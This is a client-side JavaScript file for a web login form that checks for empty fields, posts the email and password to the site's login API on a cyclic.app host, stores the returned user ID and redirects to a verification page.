const ukbutton = document.querySelector(".uk-button")
const email = document.querySelector(".Email")
const password = document.querySelector(".Password")
const Captcha = document.querySelector(".Captcha")
const ErorrBoxs = document.querySelector(".Erorr")
const ErorrBoxClose = document.querySelector(".ErorrBoxClose")
const ErorrText = document.querySelector(".ErorrText")
const spanner = document.querySelector(".spanner")
const Log = document.querySelector(".Log")

ErorrBoxClose.onclick = () => {
    ErorrBoxs.style.display = "none"
}

const url = "https://amused-cod-buckle.cyclic.app/api/login"
// const url = "https://bestkryptfield.onrender.com/api/login"

ukbutton.onclick = (e) => {
    e.preventDefault()
    const data = {
        password: password.value,
        email: email.value,
       };
       
    if( !email.value ||  !password.value || !Captcha.value ){
        ErorrBoxs.style.display = "flex"
        ErorrText.innerHTML = "You can not leave any fill entry"
        console.log("Eroo")
    }else{
          spanner.style.display = "flex"
          Log.style.display = "none"
        // console.log(data)
        fetch(url, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
          })
            .then(response => response.json())
            .then((response) => {
              console.log('Success:', response);
              if(response.message === "User not found!"){
                ErorrBoxs.style.display = "flex"
                ErorrText.innerHTML = response.message
                spanner.style.display = "none"
                Log.style.display = "flex"
              }else{
                // ErorrText.innerHTML = "Good"
              }
            localStorage.setItem("userId", JSON.stringify(response._id))
            const userid =  JSON.parse(localStorage.getItem("userId"))
            // console.log(result.message)
            window.location = `https://amused-cod-buckle.cyclic.app/api/verify/${userid}`
            // window.location = `https://bestkryptfields.netlify.app/verify/${userid}`
            }).catch((error) => {
              console.error(`onRejected function called: ${error}`);
            })
            
            
            // .catch((e) => {
            //   spanner.style.display = "none"
            //   Log.style.display = "flex"
            //     ErorrBoxs.style.display = "flex"
            //     ErorrText.innerHTML = `${e.message}`
            //   console.error('Error:', e);
            // });
}
}